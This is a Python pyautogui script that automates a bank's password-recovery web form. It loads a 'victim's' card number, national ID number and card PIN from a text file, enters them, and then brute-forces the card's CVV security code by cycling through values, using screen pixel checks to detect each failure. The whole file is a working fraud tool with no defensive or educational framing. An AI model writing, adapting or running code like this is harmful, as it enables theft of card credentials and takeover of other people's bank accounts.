import pyautogui as p
import time 
from io import open



#block
registro = open("registro.txt","a")
registro.write("Comenzando")
registro.write("\n")


arhivo_user = open("user.txt","r")
textoUser = arhivo_user.readlines()
arhivo_user.close()

victima_tar = textoUser[0].rstrip()
victima_dni = textoUser[1].rstrip()
victima_pasw = textoUser[2].rstrip()


print("*****************")

inicio = int(input("Desde que número desea comenzar?:  "))

#Veces que intenta:
#intentos = 3
#intentos = int(input("Intentos?"))

print("*****************")
print("Presione 'Enter' para continuar")
input()

#Mover y dar click
def abrir (pos,click = 1 ):
	p.moveTo(pos)
	#pyautogui.moveTo(503,315)
	p.click(clicks=click)

def ingresar():
	p.click(207,323) # click en numero de documento
	time.sleep(0.1)
	p.typewrite("12345678")
	time.sleep(0.1)
	p.click(278,322) # click en continuar
	time.sleep(0.3)
	p.click(267,196) # click en olvide mi contraseña



print(":D")

print("\n")
print("Corriendo Bot")
print("3")
time.sleep(0.5)
print("2")
time.sleep(0.5)
print("1")
print ('\a')



ingresar() 
time.sleep(1.2)

p.click(34,460) # click ahi
time.sleep(0.3)
p.click(277,675) # click en continuar abajo

time.sleep(0.4)
# LLENAR LOS DATOS

time.sleep(0.3)
#Numero de documento
p.click(366,370)
time.sleep(0.1)
p.typewrite(str(victima_dni))

time.sleep(0.3)
#Numero Tarjeta
p.click(215,435)
time.sleep(0.3)
p.typewrite(str(victima_tar), interval= 0.02)

time.sleep(0.3)
#Clave de taarjeta
p.click(321,613)
time.sleep(0.1)
p.typewrite(str(victima_pasw))

# codigo cvv
time.sleep(0.1)
p.click(301,523) # dar click en codigo de seguridad
time.sleep(0.1)
p.click(525,519) #dar click para ver la contrasena visible
time.sleep(0.1)

contador = 0 

while contador != 17:

	time.sleep(0.2)

	p.click(301,523) # dar click en codigo de seguridad

	if inicio < 100:
		p.typewrite("0")
		p.typewrite(str(inicio))

		time.sleep(0.1)
	else:
		p.typewrite(str(inicio))
		time.sleep(0.1)

	print('Intentando con: '+str(inicio))
	p.click(278,708) # click en continuar

	#Analizando
	while True:
		blanco = p.pixelMatchesColor(463,855,(255,255,255))
		time.sleep(0.1)
		if (blanco is True):
			#print("!blanco!")
			time.sleep(0.2)
			p.click(470,699) #vacio

			time.sleep(0.3)
			#Borrar el codigo anterior
			p.click(293,532) # lugar del cvv
			time.sleep(0.2)
			p.press('backspace')
			p.press('backspace')
			p.press('backspace')

			break


	#time.sleep(3)
	#print('finish')
	#input()

	inicio -= 1
	contador += 1




print("Presione 'Enter' para continuar")
input()



